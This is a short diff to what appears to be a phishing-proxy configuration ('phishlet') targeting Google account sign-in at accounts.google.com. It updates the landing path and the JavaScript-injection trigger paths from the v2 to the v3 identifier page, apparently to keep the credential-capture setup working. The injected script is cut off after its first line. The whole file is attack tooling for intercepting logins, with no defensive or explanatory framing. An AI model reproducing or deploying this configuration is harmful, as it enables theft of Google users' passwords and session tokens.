@@ -44,14 +44,14 @@ auth_urls:
   - '/_/AccountSettingsUi/browserinfo'
 
 landing_path:
-  - '/signin/v2/identifier'
+  - '/signin/v3/identifier'
 login:
     domain: 'accounts.google.com'
     path: '/ServiceLogin'
     #path: '/signin/v2/identifier'
 js_inject:  
   - trigger_domains: ["accounts.google.com"]
-    trigger_paths: ["/signin/v2/identifier"]
+    trigger_paths: ["/signin/v3/identifier"]
     trigger_params: ["email"]
     script: |
       function lp(){
